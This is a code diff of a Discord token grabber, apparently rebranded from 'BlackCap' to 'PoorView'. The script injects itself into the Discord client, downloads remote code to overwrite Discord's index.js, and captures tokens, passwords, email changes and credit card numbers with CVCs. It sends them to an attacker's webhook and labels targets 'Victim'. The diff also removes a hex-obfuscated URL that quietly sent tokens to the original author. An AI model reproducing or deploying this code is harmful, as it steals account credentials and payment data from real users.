@@ -15,9 +15,8 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Red60sapphire/BuckledPepper-Inject/index.js",
+    injection_url: "https://raw.githubusercontent.com/EustaceSop/Ipods/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -58,8 +57,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "BlackCap Grabber",
-        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+        username: "窮觀陣",
+        avatar_url: "https://github.com/EustaceSop/Ipods/blob/main/ocDIyAIDZBzcguA9EBpABD1ZcDfQeLGhjDRwNd%7Etplv-dy-resize-origshort-autoq-75_330.jpeg",
         content: "",
         embeds: [{
             title: title,
@@ -67,10 +66,10 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "BlackCap"
+                name: "窮觀陣"
             },
             footer: {
-                text: "©BuckledPepepr | https://github.com/Red60sapphire"
+                text: ""
             },
 
         }]
@@ -112,11 +111,11 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -231,12 +230,7 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,7 +245,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
+        req.write(params);
         req.end();
     })
 
@@ -260,11 +254,11 @@ const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
+    if (fs.existsSync(__dirname + "/poorview")) fs.rmdirSync(__dirname + "/poorview")
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "BlackCap Initalized",
+            title: "PoorView Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
@@ -279,13 +273,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+        if (!user.avatar) var userAvatar = "https://github.com/EustaceSop/Ipods/blob/main/ocDIyAIDZBzcguA9EBpABD1ZcDfQeLGhjDRwNd%7Etplv-dy-resize-origshort-autoq-75_330.jpeg"
+        if (!user.banner) var userBanner = "https://i.pinimg.com/736x/f2/4b/a8/f24ba878551e3fa3be7e473e252f03a0.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "BlackCap Initalized",
+            title: "PoorView Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -320,7 +314,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
+                value: `[PoorView 2023 <a:blackcapgif:1041634542093619260>](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -356,7 +350,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "BlackCaped User log out (User not Logged in before)",
+                title: "PoorView User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -371,13 +365,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            if (!user.avatar) var userAvatar = "https://github.com/EustaceSop/Ipods/blob/main/ocDIyAIDZBzcguA9EBpABD1ZcDfQeLGhjDRwNd%7Etplv-dy-resize-origshort-autoq-75_330.jpeg"
+            if (!user.banner) var userBanner = "https://i.pinimg.com/736x/f2/4b/a8/f24ba878551e3fa3be7e473e252f03a0.jpg"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "BlackCap Victim got logged out",
+                title: "PoorView Victim got logged out",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -412,7 +406,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
+                    value: `[PoorView 2023 <a:blackcapgif:1041634542093619260>](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -479,13 +473,10 @@ const checUpdate = () => {
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
     var script = `const fs = require("fs"), https = require("https")
-
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
-
 var bouki = fs.readFileSync(index).toString()
 if (bouki == "module.exports = require('./core.asar');") init()
-
 function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
@@ -493,7 +484,6 @@ function init() {
         res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
@@ -538,8 +528,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+    if (!user.avatar) var userAvatar = "https://github.com/EustaceSop/Ipods/blob/main/ocDIyAIDZBzcguA9EBpABD1ZcDfQeLGhjDRwNd%7Etplv-dy-resize-origshort-autoq-75_330.jpeg"
+    if (!user.banner) var userBanner = "https://i.pinimg.com/736x/f2/4b/a8/f24ba878551e3fa3be7e473e252f03a0.jpg"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -550,8 +540,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "BlackCap User Login",
-                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BuckledPeppered someone**](https://github.com/Red60)",
+                title: "PoorView User Login",
+                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have PoorViewed someone**](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -587,7 +577,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
+                    value: `[PoorView 2023 <a:blackcapgif:1041634542093619260>](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -631,8 +621,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/Red60sapphire)",
+                    title: "PoorView Detect Password Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have PoorViewed someone**](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -668,7 +658,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
+                        value: `[PoorView 2023 <a:blackcapgif:1041634542093619260>](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -718,8 +708,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Email Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/Red60sapphire)",
+                    title: "PoorView Detect Email Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have PoorViewed someone**](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -755,7 +745,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
+                        value: `[PoorView 2023 <a:blackcapgif:1041634542093619260>](https://www.youtube.com/channel/UC_Ot-8IXG33lx9moBFKiM7A)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -804,7 +794,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "BlackCap User Credit Card Added",
+                title: "PoorView User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
